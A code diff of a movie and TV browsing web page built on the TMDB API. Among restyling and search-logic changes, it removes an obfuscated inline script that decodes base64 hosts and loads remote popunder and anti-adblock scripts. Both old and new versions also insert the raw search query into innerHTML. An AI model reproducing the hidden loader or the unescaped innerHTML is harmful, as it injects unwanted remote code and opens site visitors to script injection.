@@ -67,55 +67,6 @@
         color: #eee;
       }
     }
-    
-    /* --- NEW SEARCH BAR STYLES --- */
-    .tm-search-form {
-      position: relative;
-      display: flex;
-      align-items: center;
-      width: 100%;
-      max-width: 700px; /* Make it slightly wider */
-      margin: 2em auto;
-      background: #23272e !important; /* Darker background for prominence */
-      border-radius: 50px; /* Capsule shape */
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
-      padding: 0;
-    }
-    .tm-search-input {
-      flex-grow: 1;
-      height: 50px; /* Taller input field */
-      padding: 0 25px;
-      background: transparent !important;
-      color: #eee !important;
-      border: none !important;
-      font-size: 1.1rem;
-    }
-    .tm-search-input:focus {
-      box-shadow: none !important;
-      outline: none;
-    }
-    .tm-search-btn {
-      width: 50px;
-      height: 50px;
-      border-radius: 50%;
-      background: #1976d2 !important;
-      color: #fff !important;
-      border: none !important;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.2rem;
-      transition: background 0.2s, transform 0.2s;
-      flex-shrink: 0;
-      margin-right: 0px;
-      margin-left: -50px; /* Hide a portion under the input for the rounded look */
-      z-index: 1;
-    }
-    .tm-search-btn:hover, .tm-search-btn:focus {
-      background: #2196f3 !important;
-      transform: scale(1.05);
-      outline: none;
-    }
     .movie-poster-wrapper, .movie-col {
       background: transparent !important;
       position: relative;
@@ -609,9 +560,6 @@
     }
   </style>
   <script type="text/javascript" data-cfasync="false">
-/*<![CDATA[/* */
-(function(){var l=window,b="de9c0ec5a7039cf40d6dc0a042c7e442",i=[["siteId",434*901*786*587-180410845774],["minBid",0],["popundersPerIP","1,1"],["delayBetween",20],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],q=["d3d3LmFudGlhZGJsb2Nrc3lzdGVtcy5jb20vd2JhdG1hbi5taW4uY3Nz","ZDNjb2Q4MHRobjdxbmQuY2xvdWRmcm9udC5uZXQvVXJ3L3Zqc3R6Lm1pbi5qcw=="],z=-1,o,y,g=function(){clearTimeout(y);z++;if(q[z]&&!(1779141316000<(new Date).getTime()&&1<z)){o=l.document.createElement("script");o.type="text/javascript";o.async=!0;var n=l.document.getElementsByTagName("script")[0];o.src="https://"+atob(q[z]);o.crossOrigin="anonymous";o.onerror=g;o.onload=function(){clearTimeout(y);l[b.slice(0,16)+b.slice(0,16)]||g()};y=setTimeout(g,5E3);n.parentNode.insertBefore(o,n)}};if(!l[b]){try{Object.freeze(l[b]=i)}catch(e){}g()}})();
-/*]]>/* */
 </script>
 </head>
 <body>
@@ -711,14 +659,13 @@
   </nav>
 
   <div class="tm-hero d-flex justify-content-center align-items-center" data-parallax="scroll" data-image-src="">
-    <form class="tm-search-form" id="movie-search-form" autocomplete="off">
-      <input class="form-control tm-search-input" type="search" id="movie-search-input" 
-             placeholder="Search by Title, Actor, or TV Show..." aria-label="Search">
-      <button class="btn tm-search-btn" type="submit">
+    <form class="d-flex tm-search-form" id="movie-search-form" autocomplete="on" style="width: 100%; max-width: 600px; margin: 2em auto;">
+      <input class="form-control tm-search-input" type="search" id="movie-search-input" placeholder="Search for movies or TV shows..." aria-label="Search">
+      <button class="btn btn-outline-success tm-search-btn" type="submit">
         <i class="fas fa-search"></i>
       </button>
     </form>
-    </div>
+  </div>
 
   <div class="container-fluid tm-container-content tm-mt-60">
     <div id="recently-viewed-section" style="display: none;">
@@ -1061,7 +1008,6 @@
       const isTablet = window.matchMedia("(min-width: 768px) and (max-width: 1199.98px)").matches;
       const perPage = isTablet ? 40 : 20; // Fetch more items on tablets
       if (currentMode === "search" && currentQuery.trim()) {
-        // TMDB's /search/multi searches for all of the requested types, which covers titles and people (actors)
         url = `https://api.themoviedb.org/3/search/multi?api_key=${apiKey}&query=${encodeURIComponent(currentQuery)}&page=${page}&include_adult=false`;
       } else if (currentMode === "anime") {
         url = `https://api.themoviedb.org/3/discover/movie?api_key=${apiKey}&with_genres=${currentGenre || 16}&with_original_language=ja${currentYear ? `&primary_release_year=${currentYear}` : ''}&sort_by=popularity.desc&page=${page}`;
@@ -1089,22 +1035,15 @@
         const response = await fetch(url);
         if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
         const data = await response.json();
-        
-        // Filter out items without media type or image/title for 'search' mode (TMDB 'multi' search can return 'person' which should be handled)
-        const results = data.results.filter(item => 
-          (item.media_type === 'movie' || item.media_type === 'tv') && (item.poster_path || item.profile_path)
-        );
-
-        if (!results || results.length === 0) {
+        if (!data.results || data.results.length === 0) {
           console.log(`[fetchMoviesInf] No results for page ${page}`);
-          // Update empty state message to reflect the new search scope
-          movieList.innerHTML = `<div class="empty-state">No movies or TV shows found for "${currentQuery || 'this category'}"${currentGenre ? ` in genre ${currentGenre}` : ''}${currentYear ? ` from ${currentYear}` : ''}.</div>`;
+          movieList.innerHTML = `<div class="empty-state">No items found for "${currentQuery || 'this category'}"${currentGenre ? ` in genre ${currentGenre}` : ''}${currentYear ? ` from ${currentYear}` : ''}.</div>`;
           return [];
         }
         totalPages = Math.min(data.total_pages || 1, maxPages);
         loadedPages.add(page);
-        console.log(`[fetchMoviesInf] Fetched ${results.length} items for page ${page}`);
-        return results.slice(0, perPage); // Limit to perPage items
+        console.log(`[fetchMoviesInf] Fetched ${data.results.length} items for page ${page}`);
+        return data.results.slice(0, perPage); // Limit to perPage items
       } catch (e) {
         console.error('[fetchMoviesInf] Error:', e);
         movieList.innerHTML = `<div class="error-state">Failed to load content. Please check your connection or try again later.</div>`;
@@ -1119,7 +1058,7 @@
       console.log(`[renderMovies] Rendering ${items.length} items, clear=${clear}`, items);
       if (clear) movieList.innerHTML = '';
       if (!items || items.length === 0) {
-        if (clear) movieList.innerHTML = `<div class="empty-state">No movies or TV shows found for "${currentQuery || 'this category'}"${currentGenre ? ` in genre ${currentGenre}` : ''}${currentYear ? ` from ${currentYear}` : ''}.</div>`;
+        if (clear) movieList.innerHTML = `<div class="empty-state">No items found for "${currentQuery || 'this category'}"${currentGenre ? ` in genre ${currentGenre}` : ''}${currentYear ? ` from ${currentYear}` : ''}.</div>`;
         return;
       }
       const fragment = document.createDocumentFragment();
@@ -1180,7 +1119,7 @@
         if (clear && !categoryItems.length) {
           setTimeout(() => {
             if (!movieList.innerHTML.includes('movie-col')) {
-              movieList.innerHTML = `<div class="empty-state">No movies or TV shows found for "${currentQuery || 'this category'}"${currentGenre ? ` in genre ${currentGenre}` : ''}${currentYear ? ` from ${currentYear}` : ''}.</div>`;
+              movieList.innerHTML = `<div class="empty-state">No items found for "${currentQuery || 'this category'}"${currentGenre ? ` in genre ${currentGenre}` : ''}${currentYear ? ` from ${currentYear}` : ''}.</div>`;
             }
           }, 500);
         }
